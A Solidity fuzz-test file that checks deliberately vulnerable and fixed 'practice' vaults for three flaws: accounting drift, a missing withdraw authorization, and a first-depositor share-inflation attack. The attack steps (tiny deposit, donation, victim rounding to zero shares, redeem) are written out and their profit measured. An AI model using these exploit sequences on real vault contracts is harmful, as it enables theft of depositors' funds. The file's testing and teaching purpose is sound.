// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "src/PracticeVaults.sol";
interface VmPractice {
    function deal(address,uint256) external;
    function prank(address) external;
}
contract EconomicPracticeTest {
    VmPractice constant vm = VmPractice(address(uint160(uint256(keccak256("hevm cheat code")))));
    address constant attacker = address(0xA11CE);
    address constant victim = address(0xB0B);
    event log_named_uint(string key, uint256 val);
    receive() external payable {}
    function size(uint96 input) internal pure returns(uint256) { return uint256(input) % 1e18 + 2; }

    function accounting(uint96 input, bool fixed_) internal {
        uint256 amount = size(input);
        AccountingPractice vault = new AccountingPractice(fixed_);
        vm.deal(address(this), amount);
        vault.deposit{value: amount}(); vault.withdraw(amount);
        require(address(vault).balance == 0 && vault.balances(address(this)) == 0, "withdraw baseline");
        require(vault.totalAssets() == (fixed_ ? 0 : amount), "accounting oracle");
        emit log_named_uint("accounting_drift_wei", vault.totalAssets());
    }
    function testFuzz_AccountingVulnerable(uint96 input) public { accounting(input, false); }
    function testFuzz_AccountingFixed(uint96 input) public { accounting(input, true); }

    function authority(uint96 input, bool fixed_) internal {
        uint256 amount = size(input);
        AuthorityPractice treasury = new AuthorityPractice(fixed_);
        vm.deal(address(treasury), amount); vm.deal(attacker, 0);
        vm.prank(attacker);
        (bool ok,) = address(treasury).call(abi.encodeCall(treasury.withdraw, ()));
        require(ok != fixed_, "authorization oracle");
        require(attacker.balance == (fixed_ ? 0 : amount), "attacker delta");
        emit log_named_uint("attacker_gain_wei", attacker.balance);
        if (fixed_) { treasury.withdraw(); require(address(treasury).balance == 0, "owner positive control"); }
    }
    function testFuzz_AuthorityVulnerable(uint96 input) public { authority(input, false); }
    function testFuzz_AuthorityFixed(uint96 input) public { authority(input, true); }

    function inflation(uint96 input, bool fixed_) internal {
        uint256 amount = size(input);
        SharePractice vault = new SharePractice(fixed_);
        uint256 capital = amount + 1;
        vm.deal(attacker, capital); vm.deal(victim, amount);
        vm.prank(attacker); vault.deposit{value: 1}(1);
        vm.prank(attacker); (bool donated,) = address(vault).call{value: amount}(""); require(donated);
        vm.prank(victim);
        (bool accepted,) = address(vault).call{value: amount}(abi.encodeCall(vault.deposit, (1)));
        require(accepted != fixed_, "slippage oracle");
        require(vault.shares(victim) == 0, "rounding setup");
        vm.prank(attacker); vault.redeem();
        uint256 gain = attacker.balance - capital;
        uint256 loss = amount - victim.balance;
        require(gain == (fixed_ ? 0 : amount), "profit oracle");
        require(loss == gain && address(vault).balance == 0, "asset conservation");
        emit log_named_uint("attacker_capital_wei", capital);
        emit log_named_uint("attacker_gain_wei", gain);
        emit log_named_uint("victim_loss_wei", loss);
    }
    function testFuzz_InflationVulnerable(uint96 input) public { inflation(input, false); }
    function testFuzz_InflationFixed(uint96 input) public { inflation(input, true); }
    function test_InflationVulnerableMeasured() public { inflation(98, false); }
    function test_InflationFixedMeasured() public { inflation(98, true); }
}
